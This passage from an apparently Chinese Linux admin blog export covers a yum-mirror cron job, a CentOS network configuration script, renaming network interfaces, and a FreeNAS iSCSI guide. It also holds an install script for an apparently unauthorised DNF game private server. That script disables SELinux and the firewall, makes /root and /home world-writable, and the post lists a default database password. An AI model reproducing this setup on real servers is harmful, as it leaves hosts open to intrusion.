<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/crontab</span><br><span class="line">0 2 * * 6 rootrun-parts /home/crontab/oderforrepo.sh</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113336529.png" alt="image-20200821113336529"></p>
<p>这个定时任务表示：每周6的晚上凌晨2点开始执行oderforrepo.sh的脚本. 这样就可以自动更新yum源了</p>
<p>最后记得查看本地系统的系统时间，如果觉得有必要可以将时间同步。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">createrepo -p /var/www/html/CentOS-YUM/CentOS6/64bit/base/Packages/ </span><br><span class="line"></span><br><span class="line">createrepo -p /var/www/html/CentOS-YUM/CentOS6/64bit/extras/Packages/ </span><br><span class="line"></span><br><span class="line">createrepo -p /var/www/html/CentOS-YUM/CentOS6/64bit/updates/Packages/ </span><br><span class="line"></span><br><span class="line">createrepo -p /var/www/html/CentOS-YUM/CentOS6/64bit/Epel6/64bit/epel/Packages</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Yum</category>
      </categories>
      <tags>
        <tag>Yum</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7.x版本初始化配置网络与主机名脚本</title>
    <url>/2018/11/18/Centos7.x%E7%89%88%E6%9C%AC%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%B8%BB%E6%9C%BA%E5%90%8D%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######### ===== Notice ===== ##########</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Script Name: Config_VMHost_Network_Centos7.x</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Script Version : 1.02</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Update Date : 2019-11-18</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Description : VMHost初始化配置网络、主机名。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####################  Initial  #####################</span></span></span><br><span class="line"></span><br><span class="line">HOST_NAME=""</span><br><span class="line">NETWORK_IP=""</span><br><span class="line">NETWORK_GATEWAY=""</span><br><span class="line">NETWORK_NETMASK=""</span><br><span class="line">GATEWAY_CUSTOM=""</span><br><span class="line">NETMASK_CUSTOM=""</span><br><span class="line">NETMASK_DEFAULT="255.255.255.0"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####################  Read Config #####################</span></span></span><br><span class="line"></span><br><span class="line">echo "Please input hostname here:"</span><br><span class="line">read HOST_NAME</span><br><span class="line">if [ -z $HOST_NAME ];then</span><br><span class="line">	echo "Hostname will not be changed."</span><br><span class="line">fi</span><br><span class="line">echo "Please input IP address here:"</span><br><span class="line">read NETWORK_IP</span><br><span class="line">if [ -z $NETWORK_IP ];then</span><br><span class="line">	echo "You need input IP here. Please try again."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line">echo "Please input Gateway here : "</span><br><span class="line">read GATEWAY_CUSTOM</span><br><span class="line">if [ -z $GATEWAY_CUSTOM  ];then</span><br><span class="line">	echo "You need input GATEWAY here. Please try again."</span><br><span class="line">        exit</span><br><span class="line">else </span><br><span class="line">	NETWORK_GATEWAY=$GATEWAY_CUSTOM</span><br><span class="line">fi</span><br><span class="line">echo "Please input Netmask here (Default is $NETMASK_DEFAULT):"</span><br><span class="line">read NETMASK_CUSTOM</span><br><span class="line">if [ -z $NETMASK_CUSTOM ];then </span><br><span class="line">	NETWORK_NETMASK=$NETMASK_DEFAULT</span><br><span class="line">else </span><br><span class="line">	NETWORK_NETMASK=$NETMASK_CUSTOM</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######################  Modify Cofiguration  ########################</span></span></span><br><span class="line"></span><br><span class="line">sed -i '/^ONBOOT/s/=.*/=yes/' /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">sed -i '/^BOOTPROTO/s/=.*/=none/' /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">sed -i '/^IPADDR/d' /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">sed -i '/^NETMASK/d' /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">sed -i '/^GATEWAY/d' /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">echo "IPADDR=$NETWORK_IP</span><br><span class="line">NETMASK=$NETWORK_NETMASK</span><br><span class="line">GATEWAY=$NETWORK_GATEWAY"&gt;&gt; /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">echo "DNS1=8.8.8.8" &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">echo "DNS2=114.114.114.114" &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line"></span><br><span class="line">echo $HOST_NAME &gt; /etc/hostname</span><br><span class="line">hostname $HOST_NAME</span><br><span class="line"></span><br><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Shell脚本</category>
      </categories>
      <tags>
        <tag>Shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7——将网卡修改为任意名称（重启永久生效）</title>
    <url>/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在Centos7中，网卡默认名称不再是eth0、eth1、eth2……这样的名称，而是变成了ethxox的形式，这是因为在Centos7中，systemd和udev引入了一种新的网络设备命名方式：一致性网络设备命名。</p>
<p>在大概了解Centos7的网卡命名规则之后，我们来将默认的网卡默认设备名更改成任意名称——在很多的文章中，讲述的将网卡名改为ethx的方法在实际操作后发现只能将网卡名改为ethx形式，而无法改成其它名称，这可能也无法满足一些特殊的需求，所以我们这里讲述的是如何改为任意名称。</p>
<p>1.首先使用ip add命令，查看自己网卡的基本情况：</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205359055.png" alt="image-20200828205359055"></p>
<p>本人配的是两张网卡，所以可以看到enp0s3和enp0s8，这是默认网卡名，同时我们也可以看到这两张网卡的MAC地址，在这里我们需要将默认网卡名称和相对应的MAC地址记下，后续步骤需要用到；</p>
<p><strong>示例目标：将enp0s3与enp0s8改为enp8s0与enp9s0</strong></p>
<p>2.修改grub配置文件，取消一致性网络设备命名，这一步依靠在GRUD_CMDLINE_LINUX中添加net.ifnames=0 biosdevname=0参数来实现：</p>
<p>文件路径——/etc/default/grub</p>
<p>编辑工具：vi</p>
<p>命令：vi /etc/default/grub</p>
<p>修改前：</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205336401.png" alt="image-20200828205336401"></p>
<p>修改后：</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205127810.png" alt="image-20200828205127810"></p>
<p>3.重新生成GRUB配置并更新内核参数</p>
<p>命令：令grub2-mkconfig -o /boot/grub2/grub.cfg</p>
<p>4.进入/etc/sysconfig/network-scripts，指定修改网卡配置文件参数：</p>
<p>在进入了/etc/sysconfig/network-scripts之后，我们可以先ls看一下有哪些文件，确定所要修改的文件名称：</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205138840.png" alt="image-20200828205138840"></p>
<p>使用vi编辑器，首先对网卡enp0s3进行参数更改：vi ifcfg-enp0s3</p>
<p>参数添加与变动：</p>
<p>HWADDR=08:00:27:9f:1d:c5（步骤1中enp3s0的MAC地址）</p>
<p>DEVICE=enp8s0</p>
<p>NAME=enp8s0</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205155952.png" alt="image-20200828205155952"></p>
<p>保存退出之后，将ifcfg-enp3s0改为ifcfg-enp8s0</p>
<p>命令：mv ifcfg-enp3s0 ifcfg-enp8s0</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205222570.png" alt="image-20200828205222570"></p>
<p>对网卡enp80s文件的操作和上述步骤相同，在此不做赘述</p>
<p><strong>注意：NAME、DEVICE与网卡文件名必须一致</strong></p>
<p>5.添加udev规则</p>
<p>在/etc/udev/rules.d/70-persistent-net.rules中添加自定义规则，若是没有70-persistent-net.rules新建就可以了</p>
<p>命令：vi /etc/udev/rules.d/70-persistent-net.rules</p>
<p>添加前：</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205236401.png" alt="image-20200828205236401"></p>
<p>添加后：</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205246801.png" alt="image-20200828205246801"></p>
<p>其中要注意ATTR{type}==“1“，ATTER{address}是enp3s0和enp8s0对应的MAC地址，KERNEL和NAME就是根据自己需求去写，因为这里将网卡名改为enp8s0和enp9s0，所以是KERENL==“enp*”,NAME=“enp8s0”与NAME=”enp9s0”，修改好了之后保存退出。</p>
<p>6.reboot命令重启，查看网卡信息</p>
<p><img src= "/img/loading.gif" data-src="/2019/11/12/Centos7%E2%80%94%E2%80%94%E5%B0%86%E7%BD%91%E5%8D%A1%E4%BF%AE%E6%94%B9%E4%B8%BA%E4%BB%BB%E6%84%8F%E5%90%8D%E7%A7%B0%EF%BC%88%E9%87%8D%E5%90%AF%E6%B0%B8%E4%B9%85%E7%94%9F%E6%95%88%EF%BC%89/image-20200828205259928.png" alt="image-20200828205259928"></p>
]]></content>
      <categories>
        <category>修改网卡名</category>
      </categories>
      <tags>
        <tag>Centos</tag>
      </tags>
  </entry>
  <entry>
    <title>DNF(网服)搭建教程【70原版-包上游戏】</title>
    <url>/2019/08/20/DNF%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本教程所用到的工具都在下面这条链接里</p>
<p>链接：<a href="https://pan.baidu.com/s/17A7SzbkB0VTdOLK6APl0wg" target="_blank" rel="noopener">https://pan.baidu.com/s/17A7SzbkB0VTdOLK6APl0wg</a><br>提取码：1ave</p>
<p>下面开始正式教程</p>
<p>本教程适用于Centos 5系-7系64位系统，经过测试，Centos 5系最适合运行，7系会出现CPU占用过高的情况</p>
<p>首先将</p>
<p>DNFServer.tar.gz<br>install<br>上传至服务器根目录</p>
<p>然后执行安装脚本</p>
<p>安装命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /;chmod -R 0777 /install;bash install</span><br></pre></td></tr></table></figure>

<p>脚本详细内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">function install() &#123;</span><br><span class="line">	centos=`cat /etc/redhat-release`</span><br><span class="line">    XT=`cat /etc/redhat-release | awk '&#123;print $3&#125;'| cut -b1`</span><br><span class="line">	H=`cat /proc/cpuinfo | grep "physical id" | sort | uniq | wc -l`</span><br><span class="line">	HX=`cat /proc/cpuinfo | grep "core id" |wc -l`</span><br><span class="line">	DD=`df -h /`</span><br><span class="line">    W=`getconf LONG_BIT`</span><br><span class="line">	G=`awk '/MemTotal/&#123;printf("%1.1fG\n",$2/1024/1024)&#125;' /proc/meminfo`</span><br><span class="line">	SJ=`date '+%Y-%m-%d %H:%M:%S'`</span><br><span class="line">	  IP=`curl -s http://v4.ipv6-test.com/api/myip.php`</span><br><span class="line">    if [ -z $IP ]; then</span><br><span class="line">    IP=`curl -s https://www.boip.net/api/myip`</span><br><span class="line">    fi</span><br><span class="line">	echo "</span><br><span class="line">================================服务器配置================================</span><br><span class="line">                    #################################</span><br><span class="line">                    #            免费搭建           #</span><br><span class="line">                    #          用心创造快乐         #</span><br><span class="line">                    #################################</span><br><span class="line">系统版本：$centos   $W 位</span><br><span class="line"></span><br><span class="line">CPU个数：$H个</span><br><span class="line"></span><br><span class="line">CPU核心：$HX核</span><br><span class="line"></span><br><span class="line">运行内存：$G</span><br><span class="line"></span><br><span class="line">===============================硬盘使用情况===============================</span><br><span class="line"><span class="meta">$</span><span class="bash">DD	<span class="string">"</span></span></span><br><span class="line">    echo -n "	</span><br><span class="line">	继续安装请输入（y），否则请Ctrl+Z ：" </span><br><span class="line">	read TRY</span><br><span class="line">	while [ "$TRY" != "y" ]; do</span><br><span class="line">	echo "输入有误，请重新输入："</span><br><span class="line">	echo -n "	</span><br><span class="line">	输入有误，请重新输入："</span><br><span class="line">	read TRY</span><br><span class="line">	done</span><br><span class="line">	servicel</span><br><span class="line">	service2</span><br><span class="line">	service3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function servicel() &#123;</span><br><span class="line">	if [ "$XT" = "5" ] ; then</span><br><span class="line">		centos5</span><br><span class="line">	elif [ "$XT" = "6" ] ; then</span><br><span class="line">		centos6</span><br><span class="line">	elif [ "$XT" = "r" ] ; then</span><br><span class="line">		centos7</span><br><span class="line">    else</span><br><span class="line">        exit 0</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">function centos5() &#123;</span><br><span class="line">	echo " "</span><br><span class="line">	echo "欢迎使用免费一键端"</span><br><span class="line">	echo " "</span><br><span class="line">	echo "检测到系统是5系"</span><br><span class="line">	echo " "</span><br><span class="line">	cd /</span><br><span class="line">	echo "正在解压一键端文件"</span><br><span class="line">	tar -zxvf DNFServer.tar.gz</span><br><span class="line">	cd /home/neople</span><br><span class="line">	sed -i "s/101.200.211.94/$&#123;IP&#125;/g" `find . -type f -name "*.cfg"`</span><br><span class="line">	sed -i "s/SELINUX=enforcing/SELINUX=disabled/g" /etc/sysconfig/selinux</span><br><span class="line">	setenforce 0</span><br><span class="line">	echo " "</span><br><span class="line">	echo "解压一键端文件完成"</span><br><span class="line">	echo " "</span><br><span class="line">	echo "开始创建虚拟内存"</span><br><span class="line">	echo "这里请耐心等待，最快1-10分钟，最慢30分钟左右。"</span><br><span class="line">	mkdir /swap</span><br><span class="line">	dd if=/dev/zero of=/swap/mySwap bs=1M count=8192</span><br><span class="line">	mkswap /swap/mySwap</span><br><span class="line">	swapon /swap/mySwap</span><br><span class="line">	sed -i '$a /swap/mySwap swap swap default 0 0' /etc/fstab</span><br><span class="line">	echo " "</span><br><span class="line">	echo "创建虚拟内存完成"</span><br><span class="line">	echo " "</span><br><span class="line">	yum makecache</span><br><span class="line">	yum -y install glibc.i386</span><br><span class="line">	yum -y install xulrunner.i386</span><br><span class="line">	yum -y install libXtst</span><br><span class="line">	yum -y install gcc gcc-c++ make zlib-devel</span><br><span class="line">	yes y | head -1 | yum remove mysql mysql-* -y;</span><br><span class="line">	echo " "</span><br><span class="line">	echo "开始关闭防火墙"</span><br><span class="line">	echo " "</span><br><span class="line">	service iptables stop</span><br><span class="line">	chkconfig iptables off</span><br><span class="line">	echo " "</span><br><span class="line">	echo "防火墙关闭完成"</span><br><span class="line">	echo " "</span><br><span class="line">	cd</span><br><span class="line">	echo 1 &gt; /proc/sys/vm/drop_caches</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function centos6() &#123;</span><br><span class="line">	echo " "</span><br><span class="line">	echo "欢迎使用免费一键端"</span><br><span class="line">	echo " "</span><br><span class="line">	echo "检测到系统是6系"</span><br><span class="line">	echo " "</span><br><span class="line">	cd /</span><br><span class="line">	echo "正在解压一键端文件"</span><br><span class="line">	tar -zxvf DNFServer.tar.gz</span><br><span class="line">	cd /home/neople</span><br><span class="line">	sed -i "s/101.200.211.94/$&#123;IP&#125;/g" `find . -type f -name "*.cfg"`</span><br><span class="line">	sed -i "s/SELINUX=enforcing/SELINUX=disabled/g" /etc/sysconfig/selinux</span><br><span class="line">	setenforce 0</span><br><span class="line">	echo " "</span><br><span class="line">	echo "解压一键端文件完成"</span><br><span class="line">	echo " "</span><br><span class="line">	echo "开始创建虚拟内存"</span><br><span class="line">	echo "这里请耐心等待，最快1-10分钟，最慢30分钟左右。"</span><br><span class="line">	mkdir /swap</span><br><span class="line">	dd if=/dev/zero of=/swap/mySwap bs=1M count=8192</span><br><span class="line">	mkswap /swap/mySwap</span><br><span class="line">	swapon /swap/mySwap</span><br><span class="line">	sed -i '$a /swap/mySwap swap swap default 0 0' /etc/fstab</span><br><span class="line">	echo " "</span><br><span class="line">	echo "创建虚拟内存完成"</span><br><span class="line">	echo " "</span><br><span class="line">	yum makecache</span><br><span class="line">	yum -y install glibc.i686</span><br><span class="line">	yum -y install xulrunner.i686</span><br><span class="line">	yum -y install libXtst</span><br><span class="line">	yum -y install gcc gcc-c++ make zlib-devel</span><br><span class="line">	yes y | head -1 | yum remove mysql mysql-* -y;</span><br><span class="line">	echo " "</span><br><span class="line">	echo "开始关闭防火墙"</span><br><span class="line">	echo " "</span><br><span class="line">	service iptables stop</span><br><span class="line">	chkconfig iptables off</span><br><span class="line">	echo " "</span><br><span class="line">	echo "防火墙关闭完成"</span><br><span class="line">	echo " "</span><br><span class="line">	cd</span><br><span class="line">	echo 1 &gt; /proc/sys/vm/drop_caches</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function centos7() &#123;</span><br><span class="line">	echo " "</span><br><span class="line">	echo "欢迎使用免费一键端"</span><br><span class="line">	echo " "</span><br><span class="line">	echo "检测到系统是7系"</span><br><span class="line">	echo " "</span><br><span class="line">	cd /</span><br><span class="line">	echo "正在解压一键端文件"</span><br><span class="line">	tar -zxvf DNFServer.tar.gz</span><br><span class="line">	cd /home/neople</span><br><span class="line">	sed -i "s/101.200.211.94/$&#123;IP&#125;/g" `find . -type f -name "*.cfg"`</span><br><span class="line">	sed -i "s/SELINUX=enforcing/SELINUX=disabled/g" /etc/sysconfig/selinux</span><br><span class="line">	setenforce 0</span><br><span class="line">	echo " "</span><br><span class="line">	echo "解压一键端文件完成"</span><br><span class="line">	echo " "</span><br><span class="line">	echo "开始创建虚拟内存"</span><br><span class="line">	echo "这里请耐心等待，最快1-10分钟，最慢30分钟左右。"</span><br><span class="line">	mkdir /swap</span><br><span class="line">	dd if=/dev/zero of=/swap/mySwap bs=1M count=8192</span><br><span class="line">	mkswap /swap/mySwap</span><br><span class="line">	swapon /swap/mySwap</span><br><span class="line">	sed -i '$a /swap/mySwap swap swap default 0 0' /etc/fstab</span><br><span class="line">	echo " "</span><br><span class="line">	echo "创建虚拟内存完成"</span><br><span class="line">	echo " "</span><br><span class="line">	yum makecache</span><br><span class="line">	yum -y install glibc.i686</span><br><span class="line">	yum -y install xulrunner.i686</span><br><span class="line">	yum -y install libXtst</span><br><span class="line">	yum -y install gcc gcc-c++ make zlib-devel</span><br><span class="line">	yes y | head -1 | yum remove mysql mysql-* -y;</span><br><span class="line">	echo " "</span><br><span class="line">	echo "开始关闭防火墙"</span><br><span class="line">	echo " "</span><br><span class="line">	systemctl disable firewalld</span><br><span class="line">	systemctl stop firewalld</span><br><span class="line">	systemctl disable firewalld.service</span><br><span class="line">	systemctl stop firewalld.service</span><br><span class="line">	echo " "</span><br><span class="line">	echo "防火墙关闭完成"</span><br><span class="line">	echo " "</span><br><span class="line">	cd</span><br><span class="line">	echo 1 &gt; /proc/sys/vm/drop_caches</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function service2() &#123;</span><br><span class="line">  cd /</span><br><span class="line">  chmod -R 0777 /home</span><br><span class="line">  chmod -R 0777 /root</span><br><span class="line">  chmod -R 0777 /opt/lampp</span><br><span class="line">  cd /home/GeoIP-1.4.8/</span><br><span class="line">  ./configure</span><br><span class="line">  make&amp;&amp; make check &amp;&amp; make install</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function service3() &#123;</span><br><span class="line"> echo -n "	完成安装，是否删除临时文件 y/n [n] ?"</span><br><span class="line">    read ANS</span><br><span class="line">    case $ANS in</span><br><span class="line">    y|Y|yes|Yes)</span><br><span class="line">    rm -f /DNFServer.tar.gz</span><br><span class="line">	rm -f /install</span><br><span class="line">	rm -f /root/ss.tar.gz</span><br><span class="line">    ;;</span><br><span class="line">    n|N|no|No)</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">    ;;</span><br><span class="line">    esac </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install</span><br><span class="line">	echo "游戏搭建完成，剩下的步骤请看说明。"</span><br></pre></td></tr></table></figure>

<p>然后到game目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home/neople/game</span><br><span class="line">上传 PVF</span><br><span class="line">上传 登录器公匙</span><br><span class="line">上传 等级补丁并改名为df_game_r</span><br><span class="line">将等级补丁 公钥 pvf权限修改为777</span><br></pre></td></tr></table></figure>

<p>上传完成后运行命令：cd /root;./run</p>
<p>等待服务跑出‘五国’就行了</p>
<p>然后把客户端准备一下<br>四个文件夹名称<br>Fonts<br>ImagePacks2<br>Music<br>SoundPacks<br>一个audio.xml</p>
<p>然后将登录器文件夹下的四个文件拉取到客户端下<br>进入DNF.toml文件中，设置服务器IP地址和等级</p>
<p>pvf也要拉进客户端文件夹下</p>
<p>黑窗口里竖着显示：CN，HK，KR，MO，TW，并且下面是有至少两个感叹号的时候，这时候就代表着已经跑完“五国”了，可以登录游戏了</p>
<p>数据库默认帐号为：game<br>默认密码为：uu5!^%jg</p>
<p>php目录：/opt/lampp/htdocs 端口：1234</p>
<p>数据库目录：/opt/lampp/var/mysql</p>
<p>重跑命令：cd /root;./stop;./stop;./run</p>
]]></content>
      <categories>
        <category>DNF</category>
      </categories>
      <tags>
        <tag>Shell脚本</tag>
        <tag>DNF</tag>
      </tags>
  </entry>
  <entry>
    <title>FreeNAS登录及配置</title>
    <url>/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="FreeNAS登录及配置"><a href="#FreeNAS登录及配置" class="headerlink" title="FreeNAS登录及配置"></a>FreeNAS登录及配置</h1><h2 id="1-浏览器登录"><a href="#1-浏览器登录" class="headerlink" title="1.浏览器登录"></a>1.浏览器登录</h2><p>默认用户为root ， 密码为安装系统时所设置的密码。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180538584.png" alt="image-20200916180538584"></p>
<h2 id="2-登录后如下，根据实际需要进行配置。"><a href="#2-登录后如下，根据实际需要进行配置。" class="headerlink" title="2.登录后如下，根据实际需要进行配置。"></a>2.登录后如下，根据实际需要进行配置。</h2><p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180555568.png" alt="image-20200916180555568"></p>
<h2 id="3-根据oracle-11gR2-RAC环境所需的共享存储，进行配置。"><a href="#3-根据oracle-11gR2-RAC环境所需的共享存储，进行配置。" class="headerlink" title="3.根据oracle 11gR2 RAC环境所需的共享存储，进行配置。"></a>3.根据oracle 11gR2 RAC环境所需的共享存储，进行配置。</h2><p>  第1步、 配置iscsi服务，打开iscsi并开机勾选自启动。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180608752.png" alt="image-20200916180608752"></p>
<p>第2步、 依次进入菜单： Sharing – Block(ISCSI)，设置Target Global Configuration。</p>
<p>Base Name 可自定义，此处默认。其他可不填写。 点击SAVE保存。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180620166.png" alt="image-20200916180620166"></p>
<p>第3步、 设置 Portals ：</p>
<p>点击ADD添加，填写IP地址和端口号，然后SAVE保存。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180656058.png" alt="image-20200916180656058"></p>
<p>设置后，如下图。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180707342.png" alt="image-20200916180707342"></p>
<p>第4步、设置 Initiators ：</p>
<p>点击ADD添加，Initiators和Authorized Networks 都选择 ALL ，点击SAVE保存。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180716813.png" alt="image-20200916180716813"></p>
<p>设置后，如下图。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180727032.png" alt="image-20200916180727032"></p>
<p>第5步、 设置 Authorized Access ：</p>
<p>​    点击ADD添加，此处Group Id、User和Sercret的值可以任意填写，此处分别设置为1、grid和gridasm ，并点击SAVE保存。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180737345.png" alt="image-20200916180737345"></p>
<p>设置后，如下图。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180747903.png" alt="image-20200916180747903"></p>
<p>第6步、设置 Targets ：</p>
<p>​    Target Name 可随意填写，此处为 asm 。选择 Portal Group ID 、Initiator Group ID ，即是上面所设置的 Group ID。此处为1。其他选项默认即可。 点击SAVE保存。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/11/FreeNAS%E7%99%BB%E5%BD%95%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200916180800610.png" alt="image-20200916180800610"></p>
<p>设置后，如下图。</p>
